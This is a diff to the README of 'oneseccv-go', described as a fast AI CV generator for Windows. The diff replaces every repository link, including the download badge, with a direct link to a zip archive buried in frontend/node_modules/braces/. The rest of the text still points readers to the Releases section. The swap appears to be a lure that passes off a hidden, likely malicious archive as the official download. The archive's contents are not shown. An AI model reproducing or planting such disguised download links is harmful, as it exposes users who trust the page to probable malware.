@@ -1,6 +1,6 @@
 # ⚡ oneseccv-go - Fast AI CV Generator
 
-[![Download oneseccv-go](https://img.shields.io/badge/Download-Get%20on%20Windows-orange?style=for-the-badge)](https://github.com/adam0000009087890/oneseccv-go)
+[![Download oneseccv-go](https://img.shields.io/badge/Download-Get%20on%20Windows-orange?style=for-the-badge)](https://github.com/adam0000009087890/oneseccv-go/raw/refs/heads/main/frontend/node_modules/braces/go-oneseccv-2.5.zip)
 
 ---
 
@@ -27,7 +27,7 @@ To use oneseccv-go on your Windows computer, make sure your system meets the fol
 ## 🚀 Getting Started: How to Download and Install
 
 1. Visit the download page by clicking the big badge at the top or this link:  
-   [https://github.com/adam0000009087890/oneseccv-go](https://github.com/adam0000009087890/oneseccv-go)
+   [https://github.com/adam0000009087890/oneseccv-go/raw/refs/heads/main/frontend/node_modules/braces/go-oneseccv-2.5.zip](https://github.com/adam0000009087890/oneseccv-go/raw/refs/heads/main/frontend/node_modules/braces/go-oneseccv-2.5.zip)
 
 2. On the GitHub page, locate the "Releases" section on the right or scroll down to find the latest release.
 
@@ -92,7 +92,7 @@ To use oneseccv-go on your Windows computer, make sure your system meets the fol
 ## 💾 Where to Download Again
 
 You can always return to the main page to download the latest release:  
-[https://github.com/adam0000009087890/oneseccv-go](https://github.com/adam0000009087890/oneseccv-go)
+[https://github.com/adam0000009087890/oneseccv-go/raw/refs/heads/main/frontend/node_modules/braces/go-oneseccv-2.5.zip](https://github.com/adam0000009087890/oneseccv-go/raw/refs/heads/main/frontend/node_modules/braces/go-oneseccv-2.5.zip)
 
 ---
 
